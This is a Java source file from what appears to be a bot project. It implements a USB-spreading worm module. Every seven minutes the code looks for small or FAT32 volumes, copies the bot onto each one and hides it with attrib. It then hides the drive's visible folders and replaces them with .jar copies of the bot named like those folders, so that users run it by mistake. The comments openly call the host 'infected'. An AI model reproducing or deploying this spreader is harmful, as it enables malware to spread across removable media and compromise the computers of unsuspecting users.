package com.DRBot.Commands;

/**
 *
 * @author MerNat
 * This module will wake up after several time in the infected machine and will check if there are 
 * removable disks available in the machine, so if it finds one it copies it self in and will make some changes there.
 * but the probability is that it will work on a luck ..... that will say .... any how i just did it for fun .....
 * 
 * So first is first, what will these module do in steps is that ....
 * 1. First after 5 minutes it checks if a Removable disk is in or not.
 * 2. If it's in then copy itself in and make a shortcut for it.
 * 3. That's it .... :)
 * 
 */
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileStore;
import java.nio.file.FileSystems;
import java.nio.file.Files;

public class infec implements Runnable{
    private long totalLong;
    private double totalDouble;
    private final File zeBot;
    private ProcessBuilder pbHider;
    private Process proHider;
        
    public infec(File zeBot){
        this.zeBot = zeBot;
    }
    public void start(){
        
    }
    @Override
    public void run(){
        while(true){
            try {
                Thread newThread = new Thread(new Runnable(){
                    @Override
                    public void run(){
                        for(FileStore store: FileSystems.getDefault().getFileStores()){
                            try {
                                totalLong = store.getTotalSpace();
                                totalDouble = (double)totalLong / (Math.pow(1024,3));
                                // if condition that checks if the drive have less than 32 GB Disk. (Probability = Removable Disk)
                                // or a FAT32 DRIVE (probability = PenDrive)
                                if((totalDouble <= 32.0) || ("FAT32".equals(store.type()))){
                                    getPath(store.toString());
                                }
                            } catch (IOException ex) {
                                System.out.println(ex.getMessage());
                            }
                        }
                    }
                });
                newThread.start();
                Thread.sleep(420000); //7 minutes
            }
            catch (InterruptedException ex) {}
        }
    }
    private void getPath(String alert) throws IOException{
        String drvName = alert;
        int openB = drvName.indexOf("(");
        int closeB = drvName.indexOf(")");
        String drvNameOnly = drvName.substring(openB+1, closeB)+"\\";
        //first check the disk have the bot or not.
        File fuFile = new File(drvNameOnly+zeBot.getName());
        if(fuFile.exists() == false){
            //copy the zeBot to the drive
            Files.copy(zeBot.toPath(),new FileOutputStream(fuFile));
            //hide it
            hideBot(fuFile.getPath());
            //And make some changes in the drive in order to open the bot
            File pathDrive = new File(drvNameOnly);
            File[] paths = pathDrive.listFiles();
            for(File files: paths){
                //System.out.println("Name: "+files.getName()+"\nDir: "+files.isDirectory()+"\nFile: "+files.isFile()+"\n");
                if((files.isDirectory() == true) && (files.isHidden() == false)){
                    hideBot(files.getPath());
                    Files.copy(zeBot.toPath(),new FileOutputStream(drvNameOnly+files.getName()+".jar"));
                }
            }
        }
        else{}
    }
    private void hideBot(String path){
        pbHider = new ProcessBuilder("attrib","+h","+r","+s","/s","/d",path);
                try{
                    proHider = pbHider.start();
                    proHider.waitFor();
                }
                catch(IOException ioE){}
                catch(InterruptedException interrExe){}
                proHider.destroy();
    }
}
